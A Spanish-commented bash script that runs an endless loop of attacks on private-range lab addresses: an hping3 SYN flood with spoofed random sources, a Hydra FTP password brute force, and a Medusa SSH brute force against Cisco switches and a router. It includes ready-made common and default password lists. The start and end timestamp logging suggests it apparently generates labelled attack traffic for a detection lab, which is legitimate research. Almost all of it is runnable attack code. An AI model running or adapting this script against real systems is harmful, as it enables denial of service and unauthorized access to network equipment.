#!/bin/bash

# Script combinado para ataques TCP SYN Flood, fuerza bruta FTP con Hydra y fuerza bruta SSH con Medusa
# Configuración
TARGET_IP_WIN="192.168.30.10"  # IP de tu PC Windows
HTTP_PORT=80                   # Puerto para SYN Flood
FTP_PORT=21                    # Puerto FTP
HYDRA_USERS=("usuario1" "usuario2" "usuario3")  # Lista de usuarios variados
HYDRA_PASS_FILE="test_passwords.txt"  # Archivo con contraseñas para FTP
TARGET_IPS=("192.168.99.1" "192.168.99.2" "192.168.99.3" "192.168.99.4")  # Lista de IPs: 3 switches + 1 router

# Archivo donde se guardarán solo las fechas de inicio/fin
LOG_FILE="attack_times.txt"

# Función para añadir una línea al logfile (solo attack type + START/END + timestamp)
log_event() {
  # Usage: log_event "SYN" "START"
  attack_type="$1"
  when="$2"   # START or END
  timestamp="$(date '+%Y-%m-%d %H:%M:%S')"
  printf "%s %s %s\n" "$attack_type" "$when" "$timestamp" >> "$LOG_FILE"
}

# Crea o actualiza test_passwords.txt cada vez (diccionario extendido a 50)
cat <<EOF > "$HYDRA_PASS_FILE"
pass123!
password
admin
adminpass
123456
qwerty
letmein
securepass
usuario1
12345678
123456789
qwerty123
abc123
1q2w3e4r
password1
iloveyou
monkey
jesus
sunshine
princess
ninja
welcome
flower
superman
batman
trustno1
zaq1zaq1
iloveme
dragon
master
football
shadow
123123
baseball
forever
123abc
starwars
computer
michelle
jennifer
thunder
123qwe
freedom
123456a
secret123
password12
hello
pass123
hacker
EOF
# Asegura formato Unix
dos2unix "$HYDRA_PASS_FILE" 2>/dev/null || sed -i 's/\r$//' "$HYDRA_PASS_FILE"

# Función para SYN Flood
simulate_syn_flood() {
  duration=$((RANDOM % 121 + 60))  # 60-180 segundos
  # Log inicio
  log_event "SYN-FLOOD" "START"
  echo "Iniciando SYN Flood a $TARGET_IP_WIN:$HTTP_PORT por $duration segundos a las $(date '+%Y-%m-%d %H:%M:%S')"
  timeout $duration hping3 -S -p $HTTP_PORT --flood --rand-source $TARGET_IP_WIN
  echo "SYN Flood terminado a las $(date '+%Y-%m-%d %H:%M:%S')"
  # Log fin
  log_event "SYN-FLOOD" "END"
}

# Función para fuerza bruta FTP
simulate_hydra_brute() {
  # Variabilidad secuencial en usuarios por ronda
  ronda_index=$((attack_counter / 3))
  user_index=$((ronda_index % 3))
  user=${HYDRA_USERS[$user_index]}
  # Log inicio
  log_event "HYDRA-FTP" "START"
  echo "Iniciando ataque de fuerza bruta a $TARGET_IP_WIN (FTP) para $user a las $(date '+%Y-%m-%d %H:%M:%S')"
  hydra -l "$user" -P "$HYDRA_PASS_FILE" -t 4 -W 1 -V $TARGET_IP_WIN ftp -o brute_results.txt
  echo "Ataque de fuerza bruta terminado a las $(date '+%Y-%m-%d %H:%M:%S')"
  # Log fin
  log_event "HYDRA-FTP" "END"

  # Opcional: Mostrar resultados
  if [ -f "brute_results.txt" ]; then
    echo "Resultados guardados en brute_results.txt:"
    cat brute_results.txt
  fi
}

# Función para fuerza bruta SSH
simulate_ssh_brute() {
  # Configuración
  USERNAME="admin"  # Usuario fijo común para Cisco
  PASS_LIST="contrasenas.txt"  # Archivo de contraseñas que se creará/sobreescribirá
  THREADS=1  # Reducido a 1 hilo para control de pausas
  SSH_PORT=22  # Puerto específico para SSH
  DELAY=1  # Pausa de 1 segundo entre intentos (ajustable)

  # Seleccionar una IP secuencial por ronda
  ronda_index=$((attack_counter / 3))
  ip_index=$((ronda_index % 4))
  TARGET_IP=${TARGET_IPS[$ip_index]}
  echo "[*] IP seleccionada para el ataque (ronda $ronda_index): $TARGET_IP"

  # Crear o sobreescribir el archivo de contraseñas con valores por defecto (ampliado a 30)
  echo "[*] Creando/sobreescribiendo el archivo de contraseñas..."
  cat << EOF > "$PASS_LIST"
password
123456
admin
letmein
root
1234
qwerty
welcome
default
12345
admin123
cisco123
password1
secret
test
12345678
login
pass
user
adminpass
ciscoroot
123456789
changeme
secure
access
network
system
manager
backup
cisco
EOF

  # Verificar si el objetivo está accesible
  echo "[*] Verificando conexión con $TARGET_IP..."
  ping -c 2 $TARGET_IP > /dev/null 2>&1
  if [ $? -ne 0 ]; then
      echo "[!] Error: No se puede conectar a $TARGET_IP. Verifica la IP o la conexión."
      return 1
  fi

  # Escanear puertos para confirmar que SSH (22) está abierto
  echo "[*] Escaneando puertos en $TARGET_IP..."
  nmap -p 22 $TARGET_IP | grep "22/tcp open" > /dev/null
  if [ $? -ne 0 ]; then
      echo "[!] Error: El puerto SSH (22) no está abierto en $TARGET_IP."
      return 1
  fi

  # Imprimir los intentos de acceso antes de ejecutar el ataque
  echo "[*] Iniciando intentos de acceso con las siguientes contraseñas para el usuario $USERNAME:"
  while IFS= read -r password; do
      if [ -n "$password" ]; then
          echo "  Probando: $USERNAME:$password"
      fi
  done < "$PASS_LIST"

  # Log inicio
  log_event "MEDUSA-SSH" "START"
  echo "[*] Inicio del ataque: $(date '+%Y-%m-%d %H:%M:%S')"

  # Ejecutar el ataque de fuerza bruta con Medusa contra SSH con pausa
  echo "[*] Iniciando ataque de fuerza bruta contra $TARGET_IP con SSH (pausa de $DELAY segundos entre intentos)..."
  medusa -h $TARGET_IP -u $USERNAME -P $PASS_LIST -M ssh -n $SSH_PORT -t $THREADS -w $DELAY -v 4

  # Log fin
  echo "[*] Fin del ataque: $(date '+%Y-%m-%d %H:%M:%S')"
  log_event "MEDUSA-SSH" "END"

  # Verificar resultado
  if [ $? -eq 0 ]; then
      echo "[+] Ataque completado. Revisa los resultados arriba."
  else
      echo "[!] Error: El ataque falló. Verifica la configuración, las credenciales o la compatibilidad de SSHv1."
  fi
}

# Bucle infinito para alternar ataques
attack_counter=0
while true; do
  # Pausa fija de 5 minutos (300 segundos)
  wait_time=300
  echo "Esperando 5 minutos antes del siguiente ataque a las $(date '+%Y-%m-%d %H:%M:%S')"
  sleep $wait_time

  # Alterna entre SYN Flood, Hydra FTP y Medusa SSH
  case $((attack_counter % 3)) in
    0)
      simulate_syn_flood
      ;;
    1)
      simulate_hydra_brute
      ;;
    2)
      simulate_ssh_brute
      ;;
  esac
  ((attack_counter++))
done